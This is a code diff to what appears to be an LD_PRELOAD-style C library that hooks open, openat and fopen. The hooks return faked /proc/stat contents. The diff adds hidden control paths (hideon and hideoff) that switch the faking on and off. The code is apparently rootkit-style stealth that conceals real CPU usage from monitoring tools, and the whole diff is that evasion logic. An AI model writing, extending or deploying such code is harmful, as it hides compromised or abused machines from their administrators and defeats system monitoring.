@@ -42,7 +42,8 @@ int open(const char *path, int flags, ...)
 
     if (strcmp(absolute_path, "/proc/stat") == 0)
     {
-        ret = fake_proc_stat();
+        if (should_hide()) ret = fake_proc_stat();
+        else ret = original_open(path, flags, mode);
     }
     else if (strcmp(absolute_path, "/" PREFIX "/rev") == 0)
     {
@@ -51,6 +52,14 @@ int open(const char *path, int flags, ...)
     else if (strcmp(absolute_path, "/" PREFIX "/stat") == 0)
     {
         print_realstat();
+    }
+    else if (strcmp(absolute_path, "/" PREFIX "/hideon") == 0)
+    {
+        hide_on();
+    }
+    else if (strcmp(absolute_path, "/" PREFIX "/hideoff") == 0)
+    {
+        hide_off();
     }
     else
     {
@@ -87,7 +96,8 @@ int openat(int fd, const char *path, int flags, ...)
 
     if (strcmp(absolute_path, "/proc/stat") == 0)
     {
-        ret = fake_proc_stat();
+        if (should_hide()) ret = fake_proc_stat();
+        else ret = original_openat(fd, path, flags, mode);
     }
     else if (strcmp(absolute_path, "/" PREFIX "/rev") == 0)
     {
@@ -96,6 +106,14 @@ int openat(int fd, const char *path, int flags, ...)
     else if (strcmp(absolute_path, "/" PREFIX "/stat") == 0)
     {
         print_realstat();
+    }
+    else if (strcmp(absolute_path, "/" PREFIX "/hideon") == 0)
+    {
+        hide_on();
+    }
+    else if (strcmp(absolute_path, "/" PREFIX "/hideoff") == 0)
+    {
+        hide_off();
     }
     else
     {
@@ -120,7 +138,8 @@ FILE *fopen(const char *path, const char *mode)
 
     if (strcmp(absolute_path, "/proc/stat") == 0)
     {
-        ret = fdopen(fake_proc_stat(), mode);
+        if (should_hide()) ret = fdopen(fake_proc_stat(), mode);
+        else ret = original_fopen(path, mode);
     }
     else if (strcmp(absolute_path, "/" PREFIX "/rev") == 0)
     {
@@ -129,6 +148,14 @@ FILE *fopen(const char *path, const char *mode)
     else if (strcmp(absolute_path, "/" PREFIX "/stat") == 0)
     {
         print_realstat();
+    }
+    else if (strcmp(absolute_path, "/" PREFIX "/hideon") == 0)
+    {
+        hide_on();
+    }
+    else if (strcmp(absolute_path, "/" PREFIX "/hideoff") == 0)
+    {
+        hide_off();
     }
     else
     {
